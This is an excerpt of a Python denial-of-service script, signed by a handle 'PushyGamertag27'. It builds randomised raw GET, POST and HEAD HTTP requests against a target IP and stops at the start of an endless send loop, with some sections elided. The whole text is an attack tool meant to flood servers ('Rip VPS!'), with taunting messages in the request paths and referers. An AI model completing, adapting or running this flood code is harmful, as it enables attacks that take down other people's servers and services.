...
referers = [
'Attack By Pushy | Sended | Rip VPS!',
'Attack By Pushy | Sended | Rip VPS!',
'Attack By Pushy | Sended | Rip VPS!',
'Attack By Pushy | Sended | Rip VPS!',
'Attack By Pushy | Sended | Rip VPS!',
...
def Headers(method):
    ...
    if method == "head" or method == "post":
        post_host = "POST /Attack By PushyGamertag27 | Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "get":
        get_host = "GET /Attack By PushyGamertag27| Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Attack By PushyGamertag27| Sended | Rip VPS! HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
